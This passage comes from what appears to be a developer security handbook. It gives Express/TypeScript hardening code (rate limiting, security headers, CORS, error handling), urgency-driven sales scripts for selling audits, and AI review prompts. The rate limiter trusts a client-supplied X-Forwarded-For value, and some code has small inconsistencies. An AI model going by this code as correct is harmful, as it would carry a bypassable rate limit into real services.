5. REQUEST SIZE LIMITS:
   - Limit JSON body size: 1MB default.
   - Limit URL-encoded body: 1MB default.
   - Limit file upload size: 10MB per file.
   - Return HTTP 413 when exceeded.

6. SERVER INFORMATION DISCLOSURE PREVENTION:
   - Remove X-Powered-By header.
   - Set custom Server header (or remove it).
   - Don't expose Node.js version in headers.
   - Custom error pages (no default Express/Next.js error page).

7. CONNECTION POOL MANAGEMENT:
   - Set appropriate keep-alive timeout.
   - Limit concurrent connections per IP.
   - Implement graceful shutdown handling.

8. TYPE SAFETY:
   - Define TypeScript interfaces for all configuration.
   - Use strict typing. No `any` types.

Output format: Complete, copy-paste-ready TypeScript files with clear
file path comments. Include the rate limiter, security headers,
CORS config, exception handler, and server setup.
```

---

## 4.4 Production Code: Infrastructure Hardening Implementation

### File: `lib/rate-limiter.ts`

```typescript
// lib/rate-limiter.ts — Redis-based sliding window rate limiter

import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

interface RateLimitConfig {
  windowMs: number;      // Time window in milliseconds
  maxRequests: number;   // Maximum requests per window
  keyPrefix: string;     // Redis key prefix
  skipSuccessfulRequests?: boolean;
  skipFailedRequests?: boolean;
}

interface RateLimitResult {
  allowed: boolean;
  remaining: number;
  limit: number;
  resetAt: number;
  retryAfterSeconds?: number;
}

// ─── Predefined Rate Limit Configurations ──────────────────────

export const RATE_LIMITS = {
  // Global: 1000 requests per minute per IP
  global: {
    windowMs: 60 * 1000,
    maxRequests: 1000,
    keyPrefix: 'rl:global',
  },
  // Auth endpoints: 10 requests per minute per IP (brute force protection)
  auth: {
    windowMs: 60 * 1000,
    maxRequests: 10,
    keyPrefix: 'rl:auth',
  },
  // API endpoints: 100 requests per minute per user
  api: {
    windowMs: 60 * 1000,
    maxRequests: 100,
    keyPrefix: 'rl:api',
  },
  // File uploads: 10 per hour per user
  upload: {
    windowMs: 60 * 60 * 1000,
    maxRequests: 10,
    keyPrefix: 'rl:upload',
  },
  // Password reset: 3 per hour per email
  passwordReset: {
    windowMs: 60 * 60 * 1000,
    maxRequests: 3,
    keyPrefix: 'rl:pwreset',
  },
} satisfies Record<string, RateLimitConfig>;

/**
 * Check rate limit using sliding window algorithm.
 * Uses Redis INCR + EXPIRE for atomic operations.
 */
export async function checkRateLimit(
  key: string,
  config: RateLimitConfig
): Promise<RateLimitResult> {
  const redisKey = `${config.keyPrefix}:${key}`;
  const now = Date.now();
  const windowStart = now - config.windowMs;

  // Use Redis pipeline for atomic operations
  const pipeline = redis.pipeline();

  // Remove expired entries outside the window
  pipeline.zremrangebyscore(redisKey, 0, windowStart);

  // Add current request timestamp
  pipeline.zadd(redisKey, { score: now, member: `${now}:${Math.random()}` });

  // Count requests in current window
  pipeline.zcard(redisKey);

  // Set expiry on the key
  pipeline.expire(redisKey, Math.ceil(config.windowMs / 1000));

  const results = await pipeline.exec();

  const requestCount = (results[2] as number) || 0;
  const remaining = Math.max(0, config.maxRequests - requestCount);
  const resetAt = now + config.windowMs;

  const allowed = requestCount <= config.maxRequests;

  if (!allowed) {
    // Calculate when the oldest request in the window will expire
    const oldestEntry = await redis.zrange(redisKey, 0, 0, { withScores: true });
    const retryAfter = oldestEntry.length > 0
      ? Math.ceil(((oldestEntry[0] as any).score + config.windowMs - now) / 1000)
      : Math.ceil(config.windowMs / 1000);

    return {
      allowed: false,
      remaining: 0,
      limit: config.maxRequests,
      resetAt,
      retryAfterSeconds: retryAfter,
    };
  }

  return {
    allowed: true,
    remaining,
    limit: config.maxRequests,
    resetAt,
  };
}

/**
 * Express middleware factory for rate limiting.
 */
export function rateLimitMiddleware(config: RateLimitConfig) {
  return async (req: any, res: any, next: any) => {
    // Extract client IP (handle proxies)
    const clientIp =
      req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.headers['x-real-ip'] ||
      req.socket.remoteAddress ||
      'unknown';

    // For user-based limiting, use user ID if available
    const key = req.userId || clientIp;

    const result = await checkRateLimit(key, config);

    // Set rate limit headers
    res.setHeader('X-RateLimit-Limit', result.limit);
    res.setHeader('X-RateLimit-Remaining', result.remaining);
    res.setHeader('X-RateLimit-Reset', Math.ceil(result.resetAt / 1000));

    if (!result.allowed) {
      // Log rate limit violation
      console.warn(
        `[RATE_LIMIT] ${config.keyPrefix} exceeded for ${key}. ` +
        `IP: ${clientIp}, Endpoint: ${req.method} ${req.path}, ` +
        `User-Agent: ${req.headers['user-agent']}`
      );

      res.setHeader('Retry-After', result.retryAfterSeconds || 60);

      return res.status(429).json({
        error: {
          code: 'RATE_LIMIT_EXCEEDED',
          message: 'Too many requests. Please try again later.',
          retryAfter: result.retryAfterSeconds,
        },
      });
    }

    next();
  };
}

/**
 * Check multiple rate limit tiers for a single request.
 * Returns the first violated limit, or allows the request.
 */
export async function checkMultipleRateLimits(
  key: string,
  limits: RateLimitConfig[]
): Promise<RateLimitResult | null> {
  for (const config of limits) {
    const result = await checkRateLimit(key, config);
    if (!result.allowed) {
      return result;
    }
  }
  return null; // All limits passed
}
```

### File: `middleware/security-headers.ts`

```typescript
// middleware/security-headers.ts — Security response headers middleware

const isProduction = process.env.NODE_ENV === 'production';

/**
 * Set all security headers on every response.
 * These headers protect against XSS, clickjacking, MIME sniffing,
 * and other client-side attacks.
 */
export function securityHeaders(req: any, res: any, next: any) {
  // ─── Content Security Policy ──────────────────────────────────
  // Restricts which resources can be loaded/executed
  const cspDirectives = [
    "default-src 'self'",
    "script-src 'self'",                              // Only self-hosted scripts
    "style-src 'self' 'unsafe-inline'",               // Allow inline styles (needed for some UI)
    "img-src 'self' data: https:",                    // Allow data: URIs for images, HTTPS sources
    "font-src 'self'",                                // Only self-hosted fonts
    "connect-src 'self' https://your-api-domain.com", // API connections
    "frame-ancestors 'none'",                         // Prevent framing (same as X-Frame-Options)
    "base-uri 'self'",                                // Prevent base tag injection
    "form-action 'self'",                             // Prevent form hijacking
    "upgrade-insecure-requests",                      // Force HTTPS
  ].join('; ');

  res.setHeader('Content-Security-Policy', cspDirectives);

  // ─── HTTP Strict Transport Security ───────────────────────────
  // Force HTTPS for 2 years, include subdomains
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=63072000; includeSubDomains; preload'
  );

  // ─── X-Content-Type-Options ──────────────────────────────────
  // Prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // ─── X-Frame-Options ─────────────────────────────────────────
  // Prevent clickjacking via iframe
  res.setHeader('X-Frame-Options', 'DENY');

  // ─── X-XSS-Protection ────────────────────────────────────────
  // Disabled because modern browsers use CSP instead
  // Setting to 0 prevents the XSS filter from doing more harm than good
  res.setHeader('X-XSS-Protection', '0');

  // ─── Referrer Policy ─────────────────────────────────────────
  // Controls how much referrer info is sent
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // ─── Permissions Policy ──────────────────────────────────────
  // Restrict browser features
  res.setHeader(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=()'
  );

  // ─── Cross-Origin Policies ────────────────────────────────────
  // Isolate browsing context
  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');

  // ─── Cache Control for API Responses ──────────────────────────
  // Prevent caching of sensitive API data
  if (req.path.startsWith('/api/')) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
  }

  // ─── Remove Server Information ────────────────────────────────
  // Prevent information disclosure
  res.removeHeader('X-Powered-By');
  res.setHeader('Server', 'Web Server');

  next();
}

/**
 * CORS configuration with explicit origin whitelist.
 * NEVER use '*' for authenticated APIs.
 */
const ALLOWED_ORIGINS = [
  'https://yourdomain.com',
  'https://www.yourdomain.com',
  // Add your frontend URLs here
  // NEVER add 'http://localhost:3000' in production
];

const ALLOWED_METHODS = 'GET, POST, PUT, DELETE, PATCH, OPTIONS';
const ALLOWED_HEADERS = 'Content-Type, Authorization, X-Requested-With, X-Request-ID';
const EXPOSED_HEADERS = 'X-Request-ID, X-RateLimit-Limit, X-RateLimit-Remaining';
const MAX_AGE = '86400'; // 24 hours preflight cache

export function corsMiddleware(req: any, res: any, next: any) {
  const origin = req.headers.origin;

  // Check if origin is in whitelist
  if (origin && ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', ALLOWED_METHODS);
    res.setHeader('Access-Control-Allow-Headers', ALLOWED_HEADERS);
    res.setHeader('Access-Control-Expose-Headers', EXPOSED_HEADERS);
    res.setHeader('Access-Control-Max-Age', MAX_AGE);

    // Log CORS preflight for monitoring
    if (req.method === 'OPTIONS') {
      console.info(
        `[CORS] Preflight from ${origin} for ${req.headers['access-control-request-method']}`
      );
    }
  } else if (origin) {
    // Origin not in whitelist — log for potential attack
    console.warn(
      `[CORS] Blocked request from unauthorized origin: ${origin}, ` +
      `IP: ${req.headers['x-forwarded-for'] || 'unknown'}`
    );
  }

  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  next();
}
```

### File: `middleware/error-handler.ts`

```typescript
// middleware/error-handler.ts — Global exception handler

import { Request, Response, NextFunction } from 'express';
import crypto from 'crypto';

/**
 * Custom application error classes.
 * Each class maps to a specific HTTP status code and error code.
 */
export class AppError extends Error {
  constructor(
    public statusCode: number,
    public code: string,
    message: string,
    public isOperational = true
  ) {
    super(message);
    this.name = 'AppError';
  }
}

export class ValidationError extends AppError {
  constructor(message: string, public fields?: Record<string, string>) {
    super(400, 'VALIDATION_ERROR', message);
    this.name = 'ValidationError';
  }
}

export class NotFoundError extends AppError {
  constructor(resource: string) {
    super(404, 'NOT_FOUND', `${resource} not found`);
    this.name = 'NotFoundError';
  }
}

export class ForbiddenError extends AppError {
  constructor(message = 'Insufficient permissions') {
    super(403, 'FORBIDDEN', message);
    this.name = 'ForbiddenError';
  }
}

export class RateLimitError extends AppError {
  constructor(retryAfter: number) {
    super(429, 'RATE_LIMIT_EXCEEDED', 'Too many requests');
    this.name = 'RateLimitError';
    this.retryAfter = retryAfter;
  }
  retryAfter: number;
}

/**
 * Global exception handler middleware.
 * Catches ALL errors and returns safe, generic responses to client.
 * Logs full error details server-side for debugging.
 */
export function globalExceptionHandler(
  err: Error,
  req: Request,
  res: Response,
  next: NextFunction
) {
  // Generate correlation ID for error tracking
  const correlationId = crypto.randomUUID();

  // Determine if error is operational (expected) or programming error
  const isOperational = err instanceof AppError && err.isOperational;
  const statusCode = err instanceof AppError ? err.statusCode : 500;
  const errorCode = err instanceof AppError ? err.code : 'INTERNAL_ERROR';

  // ─── Server-Side Logging (FULL details) ─────────────────────
  const logEntry = {
    correlationId,
    timestamp: new Date().toISOString(),
    level: statusCode >= 500 ? 'ERROR' : 'WARN',
    error: {
      name: err.name,
      message: err.message,
      code: errorCode,
      stack: err.stack,
    },
    request: {
      method: req.method,
      path: req.path,
      query: req.query,
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
      userAgent: req.headers['user-agent'],
      userId: (req as any).userId,
    },
  };

  // Log to console (in production, send to logging service)
  if (statusCode >= 500) {
    console.error(JSON.stringify(logEntry));
  } else {
    console.warn(JSON.stringify(logEntry));
  }

  // ─── Client Response (SAFE, generic) ────────────────────────
  const response: Record<string, unknown> = {
    error: {
      code: errorCode,
      message: getSafeErrorMessage(err, statusCode),
      correlationId,  // Client can reference this when contacting support
    },
  };

  // Add retry-after for rate limits
  if (err instanceof RateLimitError) {
    response.error.retryAfter = err.retryAfter;
    res.setHeader('Retry-After', err.retryAfter);
  }

  // Add validation details for 400 errors (safe to expose)
  if (err instanceof ValidationError && err.fields) {
    (response.error as any).fields = err.fields;
  }

  // NEVER expose:
  // - Stack traces
  // - File paths
  // - Database error details
  // - Library versions
  // - Internal hostnames
  // - SQL queries

  res.status(statusCode).json(response);
}

/**
 * Get a safe error message for the client.
 * Never exposes internal details.
 */
function getSafeErrorMessage(err: Error, statusCode: number): string {
  // For operational errors, the message is safe to return
  if (err instanceof AppError && err.isOperational) {
    return err.message;
  }

  // For programming errors, return generic messages
  switch (statusCode) {
    case 400:
      return 'Bad request. Please check your input.';
    case 401:
      return 'Authentication required.';
    case 403:
      return 'Insufficient permissions.';
    case 404:
      return 'Resource not found.';
    case 429:
      return 'Too many requests. Please try again later.';
    case 500:
      return 'An unexpected error occurred. Please try again later.';
    default:
      return 'An error occurred.';
  }
}

/**
 * Handle unhandled promise rejections and uncaught exceptions.
 * These are last-resort handlers for errors that escape middleware.
 */
export function setupProcessErrorHandlers() {
  process.on('unhandledRejection', (reason: unknown, promise: Promise<unknown>) => {
    console.error(JSON.stringify({
      level: 'CRITICAL',
      type: 'unhandledRejection',
      reason: reason instanceof Error ? reason.stack : String(reason),
      timestamp: new Date().toISOString(),
    }));
  });

  process.on('uncaughtException', (error: Error) => {
    console.error(JSON.stringify({
      level: 'CRITICAL',
      type: 'uncaughtException',
      error: {
        name: error.name,
        message: error.message,
        stack: error.stack,
      },
      timestamp: new Date().toISOString(),
    }));

    // Give the process time to flush logs before exiting
    setTimeout(() => {
      process.exit(1);
    }, 1000);
  });
}

/**
 * 404 handler for undefined routes.
 * Prevents information disclosure about existing routes.
 */
export function notFoundHandler(req: Request, res: Response) {
  res.status(404).json({
    error: {
      code: 'NOT_FOUND',
      message: 'The requested resource was not found.',
    },
  });
}
```

### File: `server.ts` (Main Server Setup)

```typescript
// server.ts — Production server setup with all security middleware

import express from 'express';
import { securityHeaders, corsMiddleware } from './middleware/security-headers';
import { rateLimitMiddleware, RATE_LIMITS } from './lib/rate-limiter';
import {
  globalExceptionHandler,
  notFoundHandler,
  setupProcessErrorHandlers,
} from './middleware/error-handler';

// Setup process-level error handlers
setupProcessErrorHandlers();

const app = express();

// ─── Trust Proxy (required for rate limiting behind reverse proxy) ─
app.set('trust proxy', 1);

// ─── Remove Server Header ──────────────────────────────────────
app.disable('x-powered-by');

// ─── Body Parsers with Size Limits ─────────────────────────────
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

// ─── Security Headers (applied to ALL responses) ───────────────
app.use(securityHeaders);

// ─── CORS ──────────────────────────────────────────────────────
app.use(corsMiddleware);

// ─── Global Rate Limiting (1000 req/min per IP) ────────────────
app.use(rateLimitMiddleware(RATE_LIMITS.global));

// ─── Auth-Specific Rate Limiting (10 req/min per IP) ───────────
app.use('/api/auth', rateLimitMiddleware(RATE_LIMITS.auth));

// ─── API Rate Limiting (100 req/min per user) ──────────────────
app.use('/api', rateLimitMiddleware(RATE_LIMITS.api));

// ─── Routes ────────────────────────────────────────────────────
// Import your route handlers here
// import authRoutes from './routes/auth';
// import userRoutes from './routes/users';
// import uploadRoutes from './routes/uploads';

// app.use('/api/auth', authRoutes);
// app.use('/api/users', userRoutes);
// app.use('/api/uploads', uploadRoutes);

// ─── Health Check (no rate limit, no auth) ─────────────────────
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ─── 404 Handler (after all routes) ───────────────────────────
app.use(notFoundHandler);

// ─── Global Exception Handler (last middleware) ─────────────────
app.use(globalExceptionHandler);

// ─── Start Server ──────────────────────────────────────────────
const PORT = parseInt(process.env.PORT || '3000', 10);

const server = app.listen(PORT, () => {
  console.log(`[SERVER] Running on port ${PORT} in ${process.env.NODE_ENV} mode`);
});

// ─── Graceful Shutdown ─────────────────────────────────────────
const gracefulShutdown = (signal: string) => {
  console.log(`[SERVER] ${signal} received. Starting graceful shutdown...`);

  server.close(() => {
    console.log('[SERVER] HTTP server closed');
    // Close database connections, Redis, etc.
    process.exit(0);
  });

  // Force shutdown after 30 seconds
  setTimeout(() => {
    console.error('[SERVER] Forced shutdown after timeout');
    process.exit(1);
  }, 30000);
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

export default app;
```

---

### Module 4 Security Checklist

| # | Check | Status |
|---|---|---|
| 1 | Redis-based rate limiting implemented | ⬜ |
| 2 | Global rate limit (1000 req/min per IP) | ⬜ |
| 3 | Auth endpoint rate limit (10 req/min per IP) | ⬜ |
| 4 | User-based API rate limit (100 req/min) | ⬜ |
| 5 | 429 responses include Retry-After header | ⬜ |
| 6 | Content-Security-Policy header set | ⬜ |
| 7 | Strict-Transport-Security header set | ⬜ |
| 8 | X-Content-Type-Options: nosniff set | ⬜ |
| 9 | X-Frame-Options: DENY set | ⬜ |
| 10 | CORS whitelist configured (no wildcard) | ⬜ |
| 11 | X-Powered-By header removed | ⬜ |
| 12 | Global exception handler catches all errors | ⬜ |
| 13 | Stack traces never returned to client | ⬜ |
| 14 | Correlation IDs for error tracking | ⬜ |
| 15 | JSON body size limit enforced (1MB) | ⬜ |
| 16 | 404 handler for undefined routes | ⬜ |
| 17 | Graceful shutdown handling | ⬜ |
| 18 | Process error handlers for unhandled rejections | ⬜ |

---

# MODULE 5: THE CLIENT CONVERSION & AUDIT BLUEPRINT

## Pages 17–20 | Turn Security Into Revenue

---

## 5.1 The Security Audit as a Product

Most developers treat security as a cost center. **You will treat it as a profit center.** Every vulnerability you find is a billable engagement. Every audit you deliver is a trust-building asset that leads to retainers.

> **The math is simple:** A single security audit that finds 5 critical vulnerabilities can lead to a Rs. 225,000 remediation retainer. One audit per week = Rs. 900,000/month in recurring revenue. Stop building for free. Start securing for profit.

### The Conversion Framework

```
┌──────────────────────────────────────────────────────────────────┐
│              CLIENT CONVERSION FUNNEL                            │
│                                                                  │
│  STAGE 1: FREE AUDIT (Lead Magnet)                              │
│  ┌────────────────────────────────────────────────┐              │
│  │  • 25-point system health checklist             │              │
│  │  • Takes 30 minutes to run                      │              │
│  │  • Delivers immediate value                     │              │
│  │  • Creates urgency ("You have 7 critical issues")│              │
│  │  • Cost: Rs. 0 (your time investment)           │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  STAGE 2: PAID AUDIT (Rs. 25,000)                               │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Deep code review (all 4 modules)             │              │
│  │  • Full OWASP Top 10 assessment                 │              │
│  │  • Prioritized vulnerability report             │              │
│  │  • Remediation roadmap                           │              │
│  │  • Executive summary for stakeholders            │              │
│  │  • Cost: Rs. 25,000 (one-time)                  │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  STAGE 3: REMEDIATION RETAINER (Rs. 225,000/quarter)            │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Implement all fixes from audit               │              │
│  │  • Ongoing security monitoring                   │              │
│  │  • Monthly security reviews                      │              │
│  │  • Emergency incident response                   │              │
│  │  • Quarterly security audits                     │              │
│  │  • Cost: Rs. 225,000 per quarter                │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  STAGE 4: MAINTENANCE RETAINER (Rs. 75,000/month)               │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Continuous security monitoring                │              │
│  │  • Dependency vulnerability scanning             │              │
│  │  • Monthly security reports                      │              │
│  │  • Priority support for security issues          │              │
│  │  • Cost: Rs. 75,000 per month                   │              │
│  └────────────────────────────────────────────────┘              │
└──────────────────────────────────────────────────────────────────┘
```

---

## 5.2 The 25-Point System Health Checklist

> **Run this checklist on ANY client application. Each failed item is a billable finding.**

### Authentication & Access Control (8 Points)

| # | Check | Status | Severity |
|---|---|---|---|
| 1 | JWTs stored in HTTP-Only cookies (not localStorage) | ⬜ | Critical |
| 2 | Access token expiry ≤ 15 minutes | ⬜ | Critical |
| 3 | Refresh token rotation implemented | ⬜ | High |
| 4 | Token theft detection (reuse detection) | ⬜ | High |
| 5 | Account lockout after failed login attempts | ⬜ | High |
| 6 | Generic auth error messages (no user enumeration) | ⬜ | Medium |
| 7 | Role-based access control on all endpoints | ⬜ | Critical |
| 8 | Session revocation on logout | ⬜ | Medium |

### File Upload Security (5 Points)

| # | Check | Status | Severity |
|---|---|---|---|
| 9 | File type validated against magic bytes | ⬜ | Critical |
| 10 | Files re-encoded through Sharp (metadata stripped) | ⬜ | High |
| 11 | Presigned S3 URLs (files don't touch server) | ⬜ | High |
| 12 | File size limits enforced per type | ⬜ | Medium |
| 13 | SVG files blocked | ⬜ | High |

### Database Security (5 Points)

| # | Check | Status | Severity |
|---|---|---|---|
| 14 | All inputs validated with Zod | ⬜ | Critical |
| 15 | ORM parameterized queries (no raw SQL) | ⬜ | Critical |
| 16 | Row Level Security enabled on all tables | ⬜ | Critical |
| 17 | Password hashes never returned in queries | ⬜ | High |
| 18 | Mass assignment prevented (field whitelisting) | ⬜ | High |

### Infrastructure Security (7 Points)

| # | Check | Status | Severity |
|---|---|---|---|
| 19 | Rate limiting on auth endpoints | ⬜ | Critical |
| 20 | Security headers (CSP, HSTS, X-Frame-Options) | ⬜ | High |
| 21 | CORS whitelist configured (no wildcard) | ⬜ | High |
| 22 | Stack traces never returned to client | ⬜ | High |
| 23 | Server information disclosure prevented | ⬜ | Medium |
| 24 | Error logging with correlation IDs | ⬜ | Medium |
| 25 | HTTPS enforced (HSTS header) | ⬜ | Critical |

### Scoring

| Score | Interpretation | Recommended Action |
|---|---|---|
| 25/25 | Secure | Baseline audit, quarterly reviews |
| 20-24 | Good with minor gaps | Targeted remediation (Rs. 15,000) |
| 15-19 | Moderate risk | Full security audit (Rs. 25,000) |
| 10-14 | High risk | Urgent remediation retainer (Rs. 225,000/quarter) |
| 0-9 | Critical risk | Emergency engagement (Rs. 500,000+) |

---

## 5.3 Client Script Vault: The Sales Conversation

> **Exact message templates to convert free audits into paid engagements.**

### Template 1: Initial Audit Delivery (WhatsApp/Email)

```
Hi [Client Name],

I completed the security review of [Application Name]. Here's what I found:

🔴 CRITICAL ISSUES: [X]
- [Issue 1: e.g., "JWT tokens stored in localStorage — any XSS vulnerability
  gives attackers full account access"]
- [Issue 2: e.g., "No rate limiting on login endpoint — vulnerable to brute
  force attacks"]
- [Issue 3: e.g., "SQL injection vulnerability in search endpoint — attackers
  can extract entire database"]

🟡 HIGH ISSUES: [X]
- [Issue 4]
- [Issue 5]

🟢 MEDIUM ISSUES: [X]
- [Issue 6]

I prepared a detailed report with the exact code fixes needed. Would you
like me to send it over?

The fixes would take approximately [X] hours to implement. I can start
this week if you'd like to proceed.
```

### Template 2: Follow-Up (After 24 Hours)

```
Hi [Client Name],

Just following up on the security findings. The [X] critical issues I
mentioned are actively exploitable — meaning someone could potentially
access user data right now.

I can implement all fixes for a fixed fee of Rs. [amount], or we can
set up a quarterly retainer where I handle all security concerns
proactively.

What works best for you?
```

### Template 3: Retainer Proposal

```
Hi [Client Name],

Based on the security audit, I recommend a quarterly security retainer
that includes:

✅ Implementation of all audit fixes
✅ Monthly security monitoring & reports
✅ Quarterly security audits
✅ Emergency incident response (if something goes wrong)
✅ Dependency vulnerability scanning
✅ Priority support for security issues

Investment: Rs. 225,000/quarter (Rs. 75,000/month)

This is significantly less than the cost of a data breach, which
averages Rs. 15-50 million for SMBs in Sri Lanka.

Shall we set up a call to discuss?
```

### Template 4: Urgency Driver (For Hesitant Clients)

```
Hi [Client Name],

I wanted to flag something important. The SQL injection vulnerability
I found in [endpoint] is publicly discoverable — any automated scanner
can find it within minutes.

If this is exploited:
- User data (names, emails, passwords) could be leaked
- Your business could face legal liability under [applicable law]
- Customer trust would be severely damaged
- Recovery costs typically exceed Rs. 5-10 million

I can fix this specific issue today for Rs. [amount]. Would you like
me to proceed?
```

---

## 5.4 AI Security Review Prompt: Pre-Deployment Code Audit

> **Copy this prompt into Cursor, ChatGPT, or Claude to review ANY code file for OWASP Top 10 vulnerabilities before deployment.**

### The Master Security Review Prompt

```
You are an elite application security engineer performing a pre-deployment
security audit. You have found critical vulnerabilities in Fortune 500
applications. Your reviews have prevented millions in damages.

Review the following code file for security vulnerabilities according
to the OWASP Top 10 (2021). For each vulnerability found:

1. IDENTIFY the vulnerability with OWASP category
2. EXPLAIN the attack vector (how an attacker would exploit it)
3. SHOW the exact line(s) of code that are vulnerable
4. PROVIDE the exact fix (complete replacement code)
5. RATE the severity (Critical/High/Medium/Low)
6. ESTIMATE the fix effort (hours)

OWASP TOP 10 CATEGORIES TO CHECK:

A01: Broken Access Control
- IDOR vulnerabilities
- Missing authorization checks
- Insecure direct object references
- Missing function-level access control

A02: Cryptographic Failures
- Weak hashing algorithms (MD5, SHA1)
- Hardcoded secrets/keys
- Insecure data storage
- Missing encryption for sensitive data

A03: Injection
- SQL injection
- NoSQL injection
- Command injection
- LDAP injection
- XSS (reflected, stored, DOM)

A04: Insecure Design
- Missing threat modeling
- Insufficient business logic validation
- Missing rate limiting

A05: Security Misconfiguration
- Default credentials
- Verbose error messages
- Missing security headers
- Unnecessary features enabled

A06: Vulnerable Components
- Outdated dependencies
- Known CVEs in dependencies
- Unused dependencies

A07: Authentication Failures
- Weak password requirements
- Missing multi-factor auth
- Session fixation
- Credential stuffing vulnerability

A08: Data Integrity Failures
- Insecure deserialization
- Unsigned updates
- CI/CD pipeline vulnerabilities

A09: Logging & Monitoring Failures
- Missing audit logging
- Insufficient log protection
- Missing alerting

A10: Server-Side Request Forgery (SSRF)
- Unvalidated URLs in requests
- Internal network access
- File system access

OUTPUT FORMAT:

For each vulnerability found:

### [SEVERITY] [VULNERABILITY_NAME] — OWASP [CATEGORY]

**Location:** [file:line]
**Attack Vector:** [How an attacker would exploit this]
**Impact:** [What could happen if exploited]

**Vulnerable Code:**
[exact code that is vulnerable]

**Secure Code:**
[exact replacement code]

**Fix Effort:** [X hours]

---

At the end, provide:
- TOTAL VULNERABILITIES FOUND: [count]
- CRITICAL: [count]
- HIGH: [count]
- MEDIUM: [count]
- LOW: [count]
- ESTIMATED TOTAL FIX EFFORT: [X hours]
- DEPLOYMENT RECOMMENDATION: [SAFE / FIX FIRST / BLOCK DEPLOYMENT]

DO NOT SKIP ANY LINE OF CODE. Review EVERY function, EVERY query,
EVERY endpoint, EVERY input handler. Be thorough. Be paranoid. Be right.
```

---

## 5.5 The Audit Report Template

> **Use this template to deliver professional security audit reports to clients.**

```markdown
# SECURITY AUDIT REPORT

**Application:** [Application Name]
**Client:** [Client Name]
**Audit Date:** [Date]
**Auditor:** [Your Name]
**Classification:** CONFIDENTIAL

---

## Executive Summary

[Application Name] was assessed for security vulnerabilities across
authentication, file handling, database operations, and infrastructure.

### Findings Summary

| Severity | Count | Status |
|---|---|---|
| 🔴 Critical | [X] | Requires immediate action |
| 🟠 High | [X] | Should be fixed within 1 week |
| 🟡 Medium | [X] | Should be fixed within 1 month |
| 🟢 Low | [X] | Recommended improvements |

### Risk Assessment

**Overall Risk Level:** [CRITICAL / HIGH / MEDIUM / LOW]

The application currently has [X] critical vulnerabilities that could
result in [specific impact]. Immediate remediation is recommended.

---

## Critical Findings

### [Finding 1 Title]

**Severity:** Critical
**OWASP Category:** [Category]
**Status:** Active

**Description:**
[Technical description of the vulnerability]

**Impact:**
[Business impact — data loss, financial, legal]

**Evidence:**
[Proof of concept or code reference]

**Remediation:**
[Exact steps to fix, with code]

**Estimated Fix Time:** [X hours]

---

## Remediation Roadmap

### Phase 1: Critical Fixes (Week 1)
- [ ] Fix 1: [Description] — [X hours]
- [ ] Fix 2: [Description] — [X hours]
- [ ] Fix 3: [Description] — [X hours]

### Phase 2: High Fixes (Week 2-3)
- [ ] Fix 4: [Description] — [X hours]
- [ ] Fix 5: [Description] — [X hours]

### Phase 3: Medium/Low Fixes (Month 1-2)
- [ ] Fix 6: [Description] — [X hours]
- [ ] Fix 7: [Description] — [X hours]

---

## Cost Estimate

| Phase | Effort | Cost |
|---|---|---|
| Phase 1 (Critical) | [X] hours | Rs. [amount] |
| Phase 2 (High) | [X] hours | Rs. [amount] |
| Phase 3 (Medium/Low) | [X] hours | Rs. [amount] |
| **Total** | **[X] hours** | **Rs. [amount]** |

---

## Next Steps

1. Review this report with your development team
2. Prioritize critical fixes for immediate implementation
3. Schedule remediation sessions
4. Plan follow-up audit in 30 days

---

*This report is confidential and intended solely for [Client Name].
Do not distribute without written permission.*
```

---

## 5.6 The Complete Prompt Vault: All Master Prompts in One Place

> **Quick reference for all prompts in this handbook.**

### Prompt 1: Secure JWT Authentication (Module 1)

```
You are a senior security engineer with 15 years of experience in
production authentication systems. Write a complete, production-ready
JWT authentication system for Next.js with Express.js that implements:
1. HTTP-Only cookies for token storage (NEVER localStorage)
2. RS256 asymmetric JWT signing
3. 15-minute access tokens, 7-day refresh tokens
4. Refresh token rotation with theft detection
5. Account lockout after 5 failed attempts
6. Generic error messages (no user enumeration)
Output: Complete TypeScript files with types.
```

### Prompt 2: Secure File Upload (Module 2)

```
You are a senior security engineer specializing in file upload security.
Write a complete file upload validation system for Node.js/Express that
implements:
1. Magic byte validation (JPEG: FF D8 FF, PNG: 89 50 4E 47)
2. Content-Type cross-validation
3. UUID filename generation (never use user-provided names)
4. Sharp re-encoding (strips metadata, scripts, polyglots)
5. Presigned S3 URLs (file never touches server)
6. Upload rate limiting
Output: Complete TypeScript files with types.
```

### Prompt 3: Database Security Layer (Module 3)

```
You are a database security architect. Write a complete database security
layer for Next.js using Prisma and PostgreSQL that implements:
1. Zod validation schemas for all operations (strict mode)
2. Prisma parameterized queries (no raw SQL)
3. Supabase RLS policies (user_id = auth.uid())
4. Field-level access control (passwords never returned)
5. Mass assignment prevention (whitelistFields utility)
6. Audit logging middleware
